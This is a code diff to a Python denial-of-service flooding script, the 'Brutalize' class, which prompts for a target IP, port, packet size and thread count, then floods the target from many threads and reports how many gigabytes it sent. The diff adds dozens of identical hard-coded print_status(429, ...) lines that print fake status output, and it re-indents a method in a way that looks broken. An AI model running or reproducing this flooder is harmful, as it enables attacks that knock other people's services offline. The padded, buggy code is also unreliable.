@@ -22,9 +22,10 @@ class Brutalize:
         self.data = str.encode("x" * self.force)
         self.len = len(self.data)
 
-  def print_status(self, status_code, requested_data_size):
-    print(colored("Status: [", "white") + colored(str(status_code), "red") + colored("]", "white"), end=" ")
-    print(colored("--> requested data size: ", "white") + colored(requested_data_size, "cerulean"), file=sys.stderr)
+    def print_status(status_code, requested_data_size):
+      print(colored("Status: [", "white") + colored(str(status_code), "red") + colored("]", "white"), end=" ")
+      print(colored("--> requested data size: ", "white") + colored(requested_data_size, "cerulean"), file=sys.stderr)
+
 
 
     def flood(self):
@@ -33,7 +34,7 @@ class Brutalize:
         for _ in range(self.threads):
             Thread(target=self.send).start()
         Thread(target=self.info).start()
-    
+
     def info(self):
         interval = 0.05
         now = time()
@@ -51,14 +52,68 @@ class Brutalize:
                 break
 
             if size != 0:
-                self.total += self.sent *bytdiff / gb* interval
-                self.print_status(429, "107.84KB")
+                self.total += self.sent *bytediff / gb* interval
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+                print_status(429, "107.84KB")
+
 
             now2 = time()
-        
+
             if now + 1 >= now2:
                 continue
-            
+
             size = round(self.sent * bytediff / mb)
             self.sent = 0
 
@@ -100,4 +155,57 @@ def main():
     else:
         try:
             port = int(port)
-            if port not in range(1, 6
+            if port not in range(1, 65535 + 1):
+                int('error')
+        except ValueError:
+            print("Error! Please enter a correct port.")
+            exit()
+
+    force = input("Bytes per packet [press enter for 1250] -> ")
+    print()
+
+    if force == '':
+        force = 1250
+    else:
+        try:
+            force = int(force)
+        except ValueError:
+            print("Error! Please enter an integer.")
+            exit()
+
+    threads = input("Threads [press enter for 100] -> ")
+    print()
+
+    if threads == '':
+        threads = 100
+    else:
+        try:
+            threads = int(threads)
+        except ValueError:
+            print("Error! Please enter an integer.")
+            exit()
+
+    print()
+    cport = '' if port is None else f':{port}'
+    print(f"Starting attack on {ip}{cport}.", end='\r')
+
+    brute = Brutalize(ip, port, force, threads)
+    try:
+        brute.flood()
+    except:
+        brute.stop()
+        print("A fatal error has occured and the attack was stopped.")
+        exit()
+
+    try:
+        while True:
+            sleep(1000000)
+    except KeyboardInterrupt:
+        brute.stop()
+        print(f"Attack stopped. {ip}{cport} was Brutalized with {round(brute.total, 1)} Gb.")
+    print('\n')
+    sleep(1)
+    input("Press enter to exit.")
+
+if __name__ == '__main__':
+    main()
